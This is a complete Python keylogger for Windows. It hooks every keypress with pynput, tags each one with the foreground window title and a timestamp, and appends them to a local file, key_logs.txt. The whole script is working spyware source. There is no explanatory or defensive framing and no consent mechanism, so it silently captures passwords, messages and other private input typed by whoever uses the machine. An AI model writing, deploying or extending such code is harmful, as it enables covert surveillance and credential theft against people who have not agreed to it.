import win32gui
from pynput import keyboard
import time


# when user press the key

def on_press(key):
	file = open('key_logs.txt', 'a')
	try:
		value = '{' + str( win32gui.GetWindowText(win32gui.GetForegroundWindow()) ) + ', ' + str(time.ctime()) + '} ' + str(key.char) + '\n' 
		file.write(value)
		file.close()
	except:
		value = '{' + str( win32gui.GetWindowText(win32gui.GetForegroundWindow()) ) + ', ' + str(time.ctime()) + '} ' + str(key) + '\n'
		file.write(value)
		file.close()

def on_release(key):
	pass

if __name__ == "__main__":
	with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
		listener.join()